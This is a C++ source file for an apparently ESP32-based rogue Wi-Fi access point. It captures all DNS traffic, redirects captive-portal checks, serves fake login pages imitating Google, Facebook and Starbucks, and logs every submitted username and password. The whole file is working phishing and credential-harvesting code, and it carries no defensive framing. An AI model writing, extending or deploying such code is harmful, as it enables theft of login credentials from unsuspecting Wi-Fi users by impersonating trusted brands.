#include "captive_portal.h"
#include <WiFi.h>
#include <SD.h>
#include "logger.h"
#include "portal_html.h"

CaptivePortal::CaptivePortal() : server(80) {}

void CaptivePortal::begin(const char* ssid, PortalTemplate selectedTemplate, String customPath) {
    currentTemplate = selectedTemplate;
    sdPath = customPath;
    WiFi.mode(WIFI_AP);
    WiFi.softAP(ssid);
    
    IPAddress apIP = WiFi.softAPIP();
    Logger::log("AP Started. SSID: " + String(ssid));
    Logger::log("AP IP: " + apIP.toString());
    if (sdPath != "") {
        Logger::log("Template: SD Card (" + sdPath + ")");
    } else {
        Logger::log("Template: " + String(TEMPLATE_NAMES[currentTemplate]));
    }

    dnsServer.start(DNS_PORT, "*", apIP);
    
    setupRoutes();
    server.begin();
    running = true;
}

void CaptivePortal::update() {
    if (running) {
        dnsServer.processNextRequest();
    }
}

void CaptivePortal::stop() {
    server.end();
    dnsServer.stop();
    WiFi.softAPdisconnect(true);
    running = false;
}

void CaptivePortal::setupRoutes() {
    // Captive Portal Detection
    server.on("/generate_204", HTTP_GET, [](AsyncWebServerRequest *request){
        request->redirect("/");
    });
    server.on("/fwlink", HTTP_GET, [](AsyncWebServerRequest *request){
        request->redirect("/");
    });

    // Main Portal Page
    server.on("/", HTTP_GET, [this](AsyncWebServerRequest *request){
        if (sdPath != "") {
            if (SD.exists(sdPath)) {
                request->send(SD, sdPath, "text/html");
                return;
            }
        }
        
        const uint8_t* html_gz = GENERIC_HTML_GZ;
        uint32_t html_gz_len = GENERIC_HTML_GZ_LEN;
        
        switch(currentTemplate) {
            case TEMPLATE_GOOGLE: 
                html_gz = GOOGLE_HTML_GZ; 
                html_gz_len = GOOGLE_HTML_GZ_LEN; 
                break;
            case TEMPLATE_FACEBOOK: 
                html_gz = FACEBOOK_HTML_GZ; 
                html_gz_len = FACEBOOK_HTML_GZ_LEN; 
                break;
            case TEMPLATE_STARBUCKS: 
                html_gz = STARBUCKS_HTML_GZ; 
                html_gz_len = STARBUCKS_HTML_GZ_LEN; 
                break;
            default: 
                html_gz = GENERIC_HTML_GZ; 
                html_gz_len = GENERIC_HTML_GZ_LEN; 
                break;
        }
        
        AsyncWebServerResponse *response = request->beginResponse_P(200, "text/html", html_gz, html_gz_len);
        response->addHeader("Content-Encoding", "gzip");
        request->send(response);
    });

    // Handle Login
    server.on("/login", HTTP_POST, [](AsyncWebServerRequest *request){
        String user = "";
        String pass = "";
        if (request->hasParam("user", true)) user = request->getParam("user", true)->value();
        if (request->hasParam("pass", true)) pass = request->getParam("pass", true)->value();
        
        Logger::log_credential(user, pass);
        
        AsyncWebServerResponse *response = request->beginResponse_P(200, "text/html", SUCCESS_HTML_GZ, SUCCESS_HTML_GZ_LEN);
        response->addHeader("Content-Encoding", "gzip");
        request->send(response);
    });

    // 404 Redirect to Portal
    server.onNotFound([](AsyncWebServerRequest *request){
        request->redirect("/");
    });
}
